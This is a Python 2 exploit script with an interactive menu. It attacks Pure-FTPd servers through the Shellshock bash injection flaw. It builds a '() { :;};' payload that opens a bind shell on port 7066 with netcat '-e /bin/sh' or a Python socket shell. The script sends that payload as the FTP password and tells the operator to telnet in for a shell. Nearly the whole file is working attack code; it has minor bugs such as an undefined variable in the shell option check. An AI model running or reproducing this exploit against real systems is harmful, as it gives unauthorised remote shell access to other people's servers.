import ftplib
import cmd
from random import sample
import string
from socket import AF_INET, SOCK_STREAM, socket, gethostbyname

def getToken(line):
    token = ""
    for letter in line:
        if letter != " ":
            token += letter
        else:
            break
    return token

class pureftpdBashInjectionMenu(cmd.Cmd):
  def __init__(self):
    cmd.Cmd.__init__(self)
    self.rpath = [""]
    self.shell = ["python"]
    self.host = ["ftp.debian.org"]
  def help_help(self):
    print "Usage: help [cmd]"
    print "cmd    the command to get help on"
    print "help: show help on a command or list commands"
  def help_set(self):
    print "Usage: set [var] = [val]"
    print "var    variable to set"
    print "val    value to set variable to"
    print "set: set a variable to a value"
    print "Note: you MUST use it exactly as shown: no set [var]=[val]!"
  def do_set(self, args):
    var = getToken(args)
    val = args[len(var) + 3:]
    if var == "rpath":
      self.rpath[0] = val
    elif var == "host":
      self.host[0] = val
    elif var == "shell":
      if val == "python" or shell == "netcat":
        self.shell[0] = val
      else:
        print "*** Value: must be \"python\" or \"netcat\""
        return
    else:
      print "*** Variable not found %s" % var
      return
    print "[*]%s => %s" % (var, val)
  def help_show(self):
    print "Usage: show options"
    print "show options: show the variables, current values, and descriptions"
  def do_show(self, args):
    if args != "options":
      print "*** Unknown argument: " + args
    print "Targets: Linux x86 & Linux x64"
    print "Options for pureftpd_bash_injection:"
    print "========================"
    print "rpath    %s    the target path where binaries (ls, sh, ps, etc) are kept" % self.rpath[0]
    print "shell    %s    how to spawn the shell"
    print "host    %s    the IP of the target" % self.host[0]
  def help_exit(self):
    print "Usage: exit"
    print "exit: exit the pureftpd_bash_injection context"
  def do_exit(self, args):
    if args:
      print "*** Argument number: needed 0"
      return
    return True
  def help_start(self):
    print "Usage: start"
    print "start: start the attack"
  def do_start(self, args):
    for let in "abcdefghijklmnopqrstuvwxyz":
      if let in self.host[0]:
        self.host[0] = gethostbyname(self.host[0])
    print "[*]Generating payload..."
    if self.shell[0] == "nc":
      shell = "nc -lp 7066 -e /bin/sh &"
    elif self.shell[0] == "python":
      shell = "python -c 'import os, subprocess; from socket import *; s = socket(AF_INET, SOCK_STREAM); s.bind((\"localhost\", 7066)); s.listen(5); client, addr = s.accept(); os.dup2(client.fileno(), 0); os.dup2(client.fileno(), 1); os.dup2(client.fileno(), 2); p = subprocess.call([\"/bin/sh\", \"-i\"])' &"
    payload = "() { :;}; %s/sh -c %s" % (self.rpath[0], shell)
    s = string.lowercase + string.digits
    user = ''.join(sample(s, 20))
    print "[+]Payload generated."
    print "[*]Sending payload: " + payload
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((self.host[0], 21))
    s.recv(1024)
    s.send("USER " + user)
    s.recv(1024)
    s.send("PASS " + payload)
    s.recv(1024)
    print "[+]Payload sent. Telnet to port 7066 on %s to get your shell. :)" % self.host[0]
